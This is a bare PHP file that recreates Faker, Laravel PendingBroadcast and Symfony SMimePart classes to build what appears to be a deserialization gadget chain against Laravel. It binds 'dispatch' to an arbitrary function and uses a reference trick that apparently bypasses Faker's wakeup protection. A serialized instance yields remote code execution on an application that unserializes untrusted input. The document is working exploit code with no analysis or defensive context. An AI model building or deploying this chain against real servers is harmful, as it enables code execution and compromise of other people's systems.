<?php

namespace Faker
{
    class Generator
    {
        protected $formatters = [];
        
        function __construct(&$formatters)
        {
            $this->formatters = &$formatters;
        }
    }
}

namespace Illuminate\Broadcasting
{
    class PendingBroadcast
    {
        public function __construct(&$formatters, $parameter)
        {
            $this->event = $parameter;
            $this->events = new \Faker\Generator($formatters);
        }
    }
}

namespace Symfony\Component\Mime\Part
{
    class AbstractPart
    {
        private $headers = null;

        public function __construct($parameter)
        {
            return new \Illuminate\Broadcasting\PendingBroadcast($this->headers, $parameter);
        }
    }

    class SMimePart extends AbstractPart
    {
        protected $_headers;
        public $inhann;

        function __construct($function, $parameter)
        {
            $this->_headers = ["dispatch" => $function];
            $this->inhann = parent::__construct($parameter);
        }
    }
}
